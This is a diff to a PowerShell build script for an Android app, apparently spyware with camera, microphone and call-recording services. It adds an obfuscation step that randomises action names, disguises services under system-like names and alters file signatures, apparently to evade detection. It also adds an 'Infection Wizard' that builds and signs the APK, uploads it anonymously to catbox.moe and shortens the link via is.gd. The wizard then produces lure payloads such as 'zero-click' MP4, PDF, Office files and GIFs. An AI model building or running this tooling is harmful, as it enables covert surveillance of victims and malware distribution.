@@ -463,7 +463,7 @@ function Set-AppConfig {
     if ([string]::IsNullOrEmpty($appName)) { $appName = $currentAppName }
     
     # Min SDK
-    $currentMinSdk = "26"
+    $currentMinSdk = "21"
     if (Test-Path $buildGradle) {
         if ($gradleContent -match 'minSdk\s+(\d+)') {
             $currentMinSdk = $matches[1]
@@ -503,7 +503,92 @@ function Set-AppConfig {
     $config["APP_NAME"] = $appName
     $config["VERSION_NAME"] = $versionName
     $config["VERSION_CODE"] = $versionCode
-    
+
+    # --- DYNAMIC OBFUSCATION PROTOCOL ---
+    Write-Host "[*] Configuring Dynamic Obfuscation..." -ForegroundColor Cyan
+
+    # 1. Generate Dynamic Encryption Key
+    $randKey = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})
+    $localProps = Join-Path $ProjectDir "local.properties"
+    if (Test-Path $localProps) {
+        $content = Get-Content $localProps
+        if ($content -match 'ENCRYPTION_KEY=') {
+            $content -replace 'ENCRYPTION_KEY=.*', "ENCRYPTION_KEY=$randKey" | Set-Content $localProps
+        } else {
+            Add-Content $localProps "`nENCRYPTION_KEY=$randKey"
+        }
+    } else {
+        Set-Content $localProps "ENCRYPTION_KEY=$randKey"
+    }
+
+    # 2. Add Binary Signature Entropy
+    $sysDir = Join-Path $ProjectDir "app\src\main\assets\sys"
+    if (-not (Test-Path $sysDir)) { New-Item -ItemType Directory -Path $sysDir | Out-Null }
+    for ($i=1; $i -le 3; $i++) {
+        $data = New-Object Byte[] 512
+        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($data)
+        [System.IO.File]::WriteAllBytes((Join-Path $sysDir "metadata_$i.dat"), $data)
+    }
+
+    # 3. Randomize Intent Actions in Constants.java
+    $constantsJava = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\Constants.java"
+    $manifest = Join-Path $ProjectDir "app\src\main\AndroidManifest.xml"
+    $actPrefix = "com.labs." + (-join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_}))
+
+    $actionFields = @("ACTION_AUTO_START", "ACTION_KEEP_ALIVE", "ACTION_START_STREAM", "ACTION_STOP_STREAM", "ACTION_CAPTURE_PHOTO", "ACTION_START_RECORDING", "ACTION_STOP_RECORDING", "ACTION_STOP_OPTICS", "ACTION_START_CORE", "ACTION_STOP_CORE", "ACTION_START_CALL_REC", "ACTION_STOP_CALL_REC", "ACTION_START_MIC_REC", "ACTION_STOP_MIC_REC", "ACTION_CALL_STATE_CHANGED", "ACTION_UPDATE_AUDIO_SETTINGS", "ACTION_STOP_AUDIO", "ACTION_START_AUDIO")
+
+    if (Test-Path $constantsJava) {
+        $javaContent = Get-Content $constantsJava -Raw
+        foreach ($field in $actionFields) {
+            $randAction = $actPrefix + "." + (-join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_}))
+            $javaContent = $javaContent -replace "public static final String $field = `".*?`";", "public static final String $field = `"$randAction`";"
+
+            # Sync special actions with Manifest hardcodings
+            if ($field -eq "ACTION_AUTO_START") {
+                $manifestContent = Get-Content $manifest -Raw
+                $manifestContent = $manifestContent -replace 'com\.labs\.stability\.ST_P_01', $randAction
+                Set-Content $manifest $manifestContent
+            }
+            if ($field -eq "ACTION_KEEP_ALIVE") {
+                $manifestContent = Get-Content $manifest -Raw
+                $manifestContent = $manifestContent -replace 'com\.labs\.stability\.ST_P_02', $randAction
+                Set-Content $manifest $manifestContent
+            }
+        }
+        Set-Content $constantsJava $javaContent
+    }
+
+    # 4. Service/Receiver Randomization
+    $prefix = -join ((97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_})
+    $entities = @("WorkManager_Sync", "Analytics_Provider", "MediaFrameworkService", "StatusNotification", "IO_Persistence_Manager", "TelephonyState", "SystemBoot", "InstallReferrerReceiver")
+    $mappingFile = Join-Path $ScriptDir "build_mapping.txt"
+    $mapping = @()
+
+    $manifestContent = Get-Content $manifest -Raw
+    foreach ($entity in $entities) {
+        $randName = $prefix + "_" + (-join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}))
+        $mapping += "$entity:$randName"
+
+        # Update Manifest
+        $manifestContent = $manifestContent -replace "\.$entity", ".$randName"
+
+        # Update all Java files
+        $javaFiles = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "*.java" -Recurse
+        foreach ($f in $javaFiles) {
+            $c = Get-Content $f.FullName -Raw
+            $c = $c -replace "\b$entity\b", $randName
+            Set-Content $f.FullName $c
+        }
+
+        # Rename the file
+        $fileToRename = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "$entity.java" -Recurse
+        if ($fileToRename) {
+            Rename-Item -Path $fileToRename.FullName -NewName "$randName.java"
+        }
+    }
+    Set-Content $manifest $manifestContent
+    $mapping | Set-Content $mappingFile
+
     # Google Sheet URL
     Write-Host ""
     Write-Host "[>] Google Sheet Webhook Configuration" -ForegroundColor Magenta
@@ -673,6 +758,41 @@ function Build-Apk {
     } else {
         Write-Host "    [!] Unsigned APK generation failed. See build_log.txt" -ForegroundColor Red
     }
+
+    # Revert obfuscation mapping to restore source for next build or editing
+    $mappingFile = Join-Path $ScriptDir "build_mapping.txt"
+    if (Test-Path $mappingFile) {
+        Write-Host "[*] Restoring source tree..." -ForegroundColor Cyan
+        $manifest = Join-Path $ProjectDir "app\src\main\AndroidManifest.xml"
+        $mapping = Get-Content $mappingFile
+
+        foreach ($line in $mapping) {
+            if ($line -match "(.+):(.+)") {
+                $entity = $matches[1]
+                $rand = $matches[2]
+
+                # Update Manifest
+                $manifestContent = Get-Content $manifest -Raw
+                $manifestContent = $manifestContent -replace "\.$rand", ".$entity"
+                Set-Content $manifest $manifestContent
+
+                # Update all Java files
+                $javaFiles = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "*.java" -Recurse
+                foreach ($f in $javaFiles) {
+                    $c = Get-Content $f.FullName -Raw
+                    $c = $c -replace "\b$rand\b", $entity
+                    Set-Content $f.FullName $c
+                }
+
+                # Rename the file back
+                $fileToRename = Get-ChildItem -Path (Join-Path $ProjectDir "app\src\main\java") -Filter "$rand.java" -Recurse
+                if ($fileToRename) {
+                    Rename-Item -Path $fileToRename.FullName -NewName "$entity.java"
+                }
+            }
+        }
+        Remove-Item $mappingFile -Force
+    }
     
     if ($apkFound) {
         Write-Host ""
@@ -694,6 +814,106 @@ function Build-Apk {
     Set-Location $currentDir
 }
 
+function New-ExploitStandalone {
+    param($Type, $Url, $Extra)
+
+    $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
+    $tempBin = Join-Path $ScriptDir "bin"
+    if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }
+
+    Write-Host "[*] Compiling Exploit Generator..." -ForegroundColor Cyan
+    $javacArgs = "-sourcepath", (Join-Path $ProjectDir "app\src\main\java"), "-d", $tempBin, $exploitSrc
+    & javac $javacArgs 2> build_log.txt
+
+    if ($LASTEXITCODE -eq 0) {
+        $outputDir = Join-Path $ScriptDir "output"
+        Set-Location $outputDir
+        Write-Host "[✓] Engine Ready. Producing payload..." -ForegroundColor Green
+        & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
+        Set-Location $ScriptDir
+    } else {
+        Write-Host "[!] Exploit compilation failed. Check build_log.txt" -ForegroundColor Red
+    }
+}
+
+function Invoke-InfectionWizard {
+    Write-Banner
+    Write-Host "[>] STRATEGIC_INFECTION_WIZARD" -ForegroundColor Red
+    Write-Host "    Step-by-step automated payload weaponization." -ForegroundColor Yellow
+    Write-Host ""
+
+    # Build sequence
+    if (-not (Test-Requirements)) { return }
+    New-Keystore -AutoGenerate $true
+    Set-Logo
+    Set-AppConfig
+    Build-Apk
+
+    $outputDir = Join-Path $ScriptDir "output"
+    $signedApk = Get-ChildItem -Path $outputDir -Filter "*-signed.apk" | Select-Object -First 1
+
+    if (-not $signedApk) {
+        Write-Host "[!] Build failed. Infection chain aborted." -ForegroundColor Red
+        Read-Host "Press Enter to return..."
+        return
+    }
+
+    Write-Host ""
+    Write-Host "[HOSTING] Select strategy:" -ForegroundColor Cyan
+    Write-Host "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
+    $h = Read-Host "    Choice"
+
+    $downloadUrl = ""
+    if ($h -eq "2") {
+        $ip = Read-Host "    Target IPv6"
+        $downloadUrl = "http://[$ip]:9191/download/Update.apk"
+    } else {
+        Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
+        $resp = curl.exe -sS -F "reqtype=fileupload" -F "fileToUpload=@$($signedApk.FullName)" https://catbox.moe/user/api.php
+        if ($resp -match "http") {
+            $downloadUrl = $resp.Trim()
+            Write-Host "[✓] Hosted: $downloadUrl" -ForegroundColor Green
+
+            Write-Host "[*] Shortening delivery URL..." -ForegroundColor Yellow
+            $short = curl.exe -s "https://is.gd/create.php?format=simple&url=$downloadUrl"
+            if ($short -match "http") {
+                $downloadUrl = $short.Trim()
+                Write-Host "[✓] Shortened: $downloadUrl" -ForegroundColor Green
+            }
+        } else {
+            Write-Host "[!] Upload failed: $resp" -ForegroundColor Red
+            return
+        }
+    }
+
+    Write-Host ""
+    Write-Host "[WEAPONIZE] Select Vector:" -ForegroundColor Cyan
+    Write-Host "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
+    Write-Host "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
+    Write-Host "    7. Stego Image     8. PWA Bundle    9. Office Word"
+    Write-Host "    10. Office Excel   11. Ghost GIF (Zero-Click)"
+    $v = Read-Host "    Choice"
+
+    switch ($v) {
+        "1" { New-ExploitStandalone "mp4" $downloadUrl "" }
+        "2" { New-ExploitStandalone "pdf" $downloadUrl "Security_Audit" }
+        "3" { New-ExploitStandalone "ics" $downloadUrl "Security_Sync" }
+        "4" { New-ExploitStandalone "dolby" $downloadUrl "" }
+        "5" { $tip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $downloadUrl $tip }
+        "6" { New-ExploitStandalone "vcf" $downloadUrl "System_Update" }
+        "7" { New-ExploitStandalone "stego" $downloadUrl "" }
+        "8" { New-ExploitStandalone "pwa" $downloadUrl "System_Update" }
+        "9" { New-ExploitStandalone "docx" $downloadUrl "Security_Patch" }
+        "10" { New-ExploitStandalone "xlsx" $downloadUrl "Financial_Report" }
+        "11" { New-ExploitStandalone "gif" $downloadUrl "" }
+        default { Write-Host "[!] Invalid Choice" -ForegroundColor Red }
+    }
+
+    Write-Host "`nDEPLOYMENT PACKAGE READY: $downloadUrl" -ForegroundColor Green
+    Write-Host "[INFO] Check output directory for payloads." -ForegroundColor Cyan
+    Read-Host "Press Enter to return..."
+}
+
 function Show-MainMenu {
     Write-Banner
     
@@ -704,7 +924,9 @@ function Show-MainMenu {
     Write-Host "    3. Configure Logo Only"
     Write-Host "    4. Configure App Settings Only"
     Write-Host "    5. Check/Install Requirements"
-    Write-Host "    6. Exit"
+    Write-Host "    6. Generate Infection Chain Package (Wizard)"
+    Write-Host "    7. Help / Documentation"
+    Write-Host "    8. Exit"
     Write-Host ""
     
     $option = Read-Host "    Choose option (Default 1)"
@@ -735,8 +957,26 @@ function Show-MainMenu {
         "5" {
             Test-Requirements | Out-Null
             Show-ManualJavaInstall
+            Read-Host "Press Enter to return to menu"
         }
         "6" {
+            Invoke-InfectionWizard
+        }
+        "7" {
+            # Documentation
+            Write-Banner
+            Write-Host "COMMAND_DOCUMENTATION_V1.5.0" -ForegroundColor White
+            Write-Host "------------------------------------------------------------"
+            Write-Host "1. Start Build: Standard production flow."
+            Write-Host "2. Keystore Only: Unique signing certificate."
+            Write-Host "3. Logo Only: Change app icons."
+            Write-Host "4. App Settings: Change ID, Name, and Version."
+            Write-Host "5. Requirements: Check Java setup."
+            Write-Host "6. Infection Wizard: Full Build -> Host -> Weaponize."
+            Write-Host "------------------------------------------------------------"
+            Read-Host "Press Enter..."
+        }
+        "8" {
             Write-Host "[*] Goodbye!" -ForegroundColor Cyan
             Write-Host "    Follow: https://github.com/K4N3CO-LABS/Lab-STAR" -ForegroundColor Magenta
             return
